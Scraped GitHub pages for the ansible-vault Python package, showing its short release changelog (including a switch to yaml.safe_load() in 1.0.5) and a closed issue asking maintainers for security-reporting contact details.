* [Actions](/tomoh1r/ansible-vault/actions)
* [Wiki](/tomoh1r/ansible-vault/wiki)
* [Security](/tomoh1r/ansible-vault/security)
* [Insights](/tomoh1r/ansible-vault/pulse)

## Files

 v1.0.5
## Breadcrumbs

1. [ansible-vault](/tomoh1r/ansible-vault/tree/v1.0.5)
/
# CHANGES.txt

Copy path Blame  Blame
## Latest commit

## History

[History](/tomoh1r/ansible-vault/commits/v1.0.5/CHANGES.txt)27 lines (16 loc) · 349 Bytes v1.0.5
## Breadcrumbs

1. [ansible-vault](/tomoh1r/ansible-vault/tree/v1.0.5)
/
# CHANGES.txt

Top
## File metadata and controls

* Code
* Blame

27 lines (16 loc) · 349 Bytes[Raw](https://github.com/tomoh1r/ansible-vault/raw/refs/tags/v1.0.5/CHANGES.txt)1234567891011121314151617181920212223242526271.0.5 (2017/09/13)
\* Update to use yaml.safe\_load()$\* Update to tomoh1r$
1.0.4 (2015/11/29)
\* Apply to Ansible 2\* Add unit tests
1.0.3 (2015/05/18)
\* fix README.rst typo
1.0.2 (2015/05/18)
\* shipped with python modules
1.0.1 (2015/05/17)
\* add python module\* add CHANGES.txt\* update url on setup.py
1.0.0 (2015/05/17)
\* first release

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_5e8738ab_20250124_221953.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Ftomoh1r%2Fansible-vault%2Fissues%2F4)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Ftomoh1r%2Fansible-vault%2Fissues%2F4)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fissues_fragments%2Fissue_layout&source=header-repo&source_repo=tomoh1r%2Fansible-vault)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[tomoh1r](/tomoh1r)
/
**[ansible-vault](/tomoh1r/ansible-vault)**
Public

* [Notifications](/login?return_to=%2Ftomoh1r%2Fansible-vault) You must be signed in to change notification settings
* [Fork
  32](/login?return_to=%2Ftomoh1r%2Fansible-vault)
* [Star
   54](/login?return_to=%2Ftomoh1r%2Fansible-vault)

* [Code](/tomoh1r/ansible-vault)
* [Issues
  6](/tomoh1r/ansible-vault/issues)
* [Pull requests
  4](/tomoh1r/ansible-vault/pulls)
* [Discussions](/tomoh1r/ansible-vault/discussions)
* [Actions](/tomoh1r/ansible-vault/actions)
* [Wiki](/tomoh1r/ansible-vault/wiki)
* [Security](/tomoh1r/ansible-vault/security)
* [Insights](/tomoh1r/ansible-vault/pulse)

Additional navigation options

* [Code](/tomoh1r/ansible-vault)
* [Issues](/tomoh1r/ansible-vault/issues)
* [Pull requests](/tomoh1r/ansible-vault/pulls)
* [Discussions](/tomoh1r/ansible-vault/discussions)
* [Actions](/tomoh1r/ansible-vault/actions)
* [Wiki](/tomoh1r/ansible-vault/wiki)
* [Security](/tomoh1r/ansible-vault/security)
* [Insights](/tomoh1r/ansible-vault/pulse)

# Security issue #4

[New issue](/login?return_to=)[Jump to bottom](#comment-composer-heading)Copy link[New issue](/login?return_to=)[Jump to bottom](#comment-composer-heading)Copy linkClosedClosed[Security issue](#top)#4Copy link[![@regiwils](https://avatars.githubusercontent.com/u/20667304?v=4&size=80)](/regiwils)
## Description

[![@regiwils](https://avatars.githubusercontent.com/u/20667304?v=4&size=48)](/regiwils)[regiwils](https://github.com/regiwils)opened [on May 9, 2017](https://github.com/tomoh1r/ansible-vault/issues/4#issue-227405078)

Please provide contact/information on reporting security issues for Ansible-vault

## Metadata

### Assignees

No one assigned

### Labels

No labelsNo labels
### Projects

No projects
### Milestone

No milestone

### Relationships

None yet
### Development

No branches or pull requests
## Issue actions

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


